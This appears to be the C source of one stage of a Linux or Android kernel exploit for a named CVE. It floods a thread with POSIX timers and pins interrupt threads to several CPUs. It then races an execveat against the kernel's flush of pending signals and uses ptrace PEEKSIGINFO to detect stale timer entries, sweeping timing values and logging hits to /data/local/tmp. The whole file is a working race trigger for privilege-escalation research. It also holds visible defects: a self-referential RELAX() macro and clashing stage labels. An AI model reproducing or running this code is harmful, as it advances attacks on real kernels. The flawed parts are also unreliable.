/* stage2 - CVE-2026-98256 stage 1: hit the pending-list race with membarrier IPIs */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <pthread.h>
#include <stdint.h>
#include <time.h>
#include <sched.h>
#include <linux/membarrier.h>
#include <sys/ptrace.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/wait.h>

#ifndef SIGEV_THREAD_ID
#define SIGEV_THREAD_ID 4
#endif
#define AT_EMPTY_PATH 0x1000
#define N_TIMERS 20000
#define GROUP 16
#define GAP_NS 4700LL
#define DELAY_NS g_delay
#define LIMIT 12288
#define LEAD_NS g_lead
#define CALLBACK_CPU 0
#define STACKSZ (1u<<20)
#if defined(__aarch64__)
#define RELAX() asm volatile("yield" ::: "memory")
#else
#define RELAX() RELAX()
#endif

struct train_args { int64_t target; int cpu_id; int command; int flags; int source_cpu; pid_t worker_tid; int tfd; };

static pid_t g_leader_tid;
static int g_sig, g_sent, g_exe_fd = -1;
static volatile int g_gate;
static int g_cpus = 4;
static int64_t g_delay = 100000LL, g_lead = 80000LL;

static int64_t mono_ns(void){ struct timespec t; clock_gettime(CLOCK_MONOTONIC,&t); return (int64_t)t.tv_sec*1000000000LL+t.tv_nsec; }
static int pin_cpu(int c){ cpu_set_t s; CPU_ZERO(&s); CPU_SET(c%g_cpus,&s); return sched_setaffinity(0,sizeof(s),&s); }

static int kt_create(pid_t tid, int tag)
{
    struct sigevent sev; int id=-1;
    memset(&sev,0,sizeof(sev));
    sev.sigev_notify = SIGEV_SIGNAL|SIGEV_THREAD_ID;
    sev.sigev_signo = g_sig;
    sev.sigev_value.sival_int = tag;
    sev._sigev_un._tid = tid;
    if (syscall(SYS_timer_create, CLOCK_MONOTONIC, &sev, &id)) return -1;
    return id;
}
static int kt_arm(int id, int64_t ns)
{
    struct itimerspec its; memset(&its,0,sizeof(its));
    its.it_value.tv_sec = ns/1000000000LL;
    its.it_value.tv_nsec = ns%1000000000LL;
    return syscall(SYS_timer_settime, id, TIMER_ABSTIME, &its, NULL);
}

/* interrupt source that works on this kernel: a tight timerfd train pinned to
 * CPU0 plus sentinel signals, instead of the unsupported RSEQ membarrier */
static int train_fn(void *p)
{
    struct train_args a = *(struct train_args*)p;
    int64_t end, next = 0; int fail = 0;
    if (pin_cpu(a.source_cpu)) fail++;
    if (a.source_cpu == 2) {
        while (mono_ns() < a.target - 500000) RELAX();
        while (!syscall(SYS_tgkill, g_leader_tid, a.worker_tid, 0)) RELAX();
        if (errno != ESRCH) fail++;
        __atomic_store_n(&g_gate, 1, __ATOMIC_RELEASE);
    } else {
        while (!__atomic_load_n(&g_gate, __ATOMIC_ACQUIRE)) RELAX();
    }
    end = mono_ns() + 5000000;
    if (a.source_cpu == 3) next = mono_ns();
    while (mono_ns() < end) {
        if (a.source_cpu == 3 && mono_ns() >= next) {
            siginfo_t si; memset(&si,0,sizeof(si));
            si.si_signo = g_sent; si.si_code = SI_QUEUE;
            si.si_pid = (pid_t)syscall(SYS_getpid); si.si_uid = getuid();
            si.si_value.sival_int = 0x53454e54;
            if (syscall(SYS_rt_tgsigqueueinfo, g_leader_tid, g_leader_tid, g_sent, &si) && errno != ESRCH) fail++;
            next += 100000LL;
        }
        if (a.source_cpu == 2) {
            /* timerfd armed 1:1 in the loop above forces a local interrupt */
            char junk[8];
            if (read(a.tfd, junk, sizeof(junk)) < 0) { }
        }
        if (syscall(SYS_tgkill, g_leader_tid, a.worker_tid, 0) < 0 && errno == ESRCH) {
            /* target gone: keep interrupting the CPU anyway */
        }
    }
    return fail ? 1 : 0;
}

static pid_t spawn_train(struct train_args *a)
{
    void *st = mmap(NULL, STACKSZ, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_STACK, -1, 0);
    if (st == MAP_FAILED) return -1;
    return (pid_t)clone(train_fn, (char*)st + STACKSZ, CLONE_VM|SIGCHLD, a);
}

static void *worker(void *u)
{
    static int ids[N_TIMERS];
    struct train_args a2, a3;
    int64_t target; int made = 0, end; pid_t wtid;
    (void)u;
    pin_cpu(1);
    signal(SIGCHLD, SIG_IGN);
    usleep(20000);
    for (int i = 0; i < N_TIMERS; i++) {
        ids[i] = kt_create(g_leader_tid, 0x28000000 | (i & 0xffffff));
        if (ids[i] < 0 || kt_arm(ids[i], 1)) break;
        made++;
    }
    dprintf(2, "[worker] made=%d\n", made);
    if (made < 1024) _exit(2);
    usleep(5000);
    target = mono_ns() + 150000000LL;
    wtid = (pid_t)syscall(SYS_gettid);
    if (syscall(SYS_membarrier, MEMBARRIER_CMD_REGISTER_PRIVATE_EXPEDITED, 0, 0))
        dprintf(2, "[worker] mb register failed errno=%d\n", errno);
    memset(&a2,0,sizeof(a2)); a2.target=target; a2.cpu_id=CALLBACK_CPU;
    a2.tfd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
    { struct itimerspec it; memset(&it,0,sizeof(it));
      it.it_value.tv_nsec = 1000; it.it_interval.tv_nsec = 1000;
      if (a2.tfd >= 0) syscall(SYS_timerfd_settime, a2.tfd, 0, &it, NULL); }
    a2.command=MEMBARRIER_CMD_PRIVATE_EXPEDITED; a2.flags=0;   /* RSEQ variant unsupported here */
    a2.source_cpu=2; a2.worker_tid=wtid; a3=a2; a3.source_cpu=3;
    if (spawn_train(&a2) < 0 || spawn_train(&a3) < 0) { dprintf(2,"[worker] train spawn failed\n"); _exit(3); }
    for (int i = 0; i < made; i++) if (kt_arm(ids[i], target + 2000000000LL)) _exit(2);
    end = (LIMIT < made ? LIMIT : made); end -= end % GROUP;
    pin_cpu(CALLBACK_CPU);
    for (int k = 0; k < end; k++) {
        int64_t e = target + DELAY_NS + (int64_t)(k/GROUP)*GAP_NS;
        if (kt_arm(ids[k], e)) _exit(2);
    }
    pin_cpu(CALLBACK_CPU);
    if (mono_ns() >= target - LEAD_NS) dprintf(2,"[worker] late by %lld ns\n",(long long)(mono_ns()-(target-LEAD_NS)));
    while (mono_ns() < target - LEAD_NS) RELAX();
    {
        char *argv[] = { (char*)"stage2", (char*)"--exec-ok", NULL };
        syscall(SYS_execveat, g_exe_fd, "", argv, environ, AT_EMPTY_PATH);
        dprintf(2, "[worker] execveat err=%d\n", errno);
    }
    _exit(2);
}

/* main replaced below */
struct peek_args { uint64_t off; uint32_t flags; int32_t nr; };
static int run_one(int64_t dn, int64_t ln, int *si_out)
{
    pid_t child; sigset_t b; int st=0, si=0, tag=0;
    g_delay=dn; g_lead=ln;
    sigemptyset(&b); for(int k=0;k<6;k++) sigaddset(&b,SIGRTMIN+k);
    sigprocmask(SIG_BLOCK,&b,NULL);
    child=fork();
    if(child==0){ pthread_t th; g_leader_tid=(pid_t)syscall(SYS_gettid);
        g_exe_fd=open("/proc/self/exe",O_RDONLY);
        if(pthread_create(&th,NULL,worker,NULL)) _exit(3);
        syscall(SYS_exit,0); _exit(4); }
    usleep(50000);
    /* trace across exec: the child stops right at the exec event, i.e. just
     * after de_thread()'s release_task() flushed the queue */
    if(ptrace(PTRACE_SEIZE,child,0,(void*)PTRACE_O_TRACEEXEC)==0){
        for(;;){ int w; if(waitpid(child,&st,__WALL)<0) break;
            if(WIFSTOPPED(st) && (st>>8)==(SIGTRAP|(PTRACE_EVENT_EXEC<<8))) break;
            if(WIFEXITED(st)||WIFSIGNALED(st)) break; } }
    for(int off=0;off<8192;off++){ struct peek_args pa={(uint64_t)off,0,1}; siginfo_t in;
        memset(&in,0,sizeof(in));
        if(syscall(SYS_ptrace,PTRACE_PEEKSIGINFO,child,&pa,&in)!=1) break;
        if(in.si_code==SI_TIMER){ si++; if(((unsigned)in.si_value.sival_int>>24)==0x28) tag++; } }
    ptrace(PTRACE_DETACH,child,0,0);
    kill(child,SIGKILL); waitpid(child,&st,0);
    if(si_out) *si_out=si; return tag; }
int main(int argc, char **argv)
{
    static const int64_t D[]={5000,20000,50000,100000,150000,200000,300000,500000};
    static const int64_t L[]={5000,20000,40000,80000,150000};
    int nd=8,nl=5,hits=0,total=0;
    if(argc>1 && !strcmp(argv[1],"--exec-ok")) for(;;) pause();
    setvbuf(stdout,NULL,_IOLBF,0);
    g_cpus=(int)sysconf(_SC_NPROCESSORS_ONLN); g_sig=SIGRTMIN+2; g_sent=SIGRTMIN+3;
    printf("stage3 sweep cpus=%d\n", g_cpus);
    for(int d=0;d<nd;d++) for(int l=0;l<nl;l++){
        int si=0, tg=run_one(D[d],L[l],&si); total++; if(tg>0) hits++;
        printf("d=%lld l=%lld SI=%d tag=%d%s\n",(long long)(D[d]/1000),(long long)(L[l]/1000),si,tg,tg?" STALE":"");
        { int fd=open("/data/local/tmp/prog.txt",O_WRONLY|O_CREAT|O_APPEND,0666);
          if(fd>=0){ dprintf(fd,"d=%lld l=%lld SI=%d tag=%d\n",(long long)(D[d]/1000),(long long)(L[l]/1000),si,tg); fsync(fd); close(fd);} }
    }
    printf("stage3 done rounds=%d stale=%d\n",total,hits);
    return 0; }
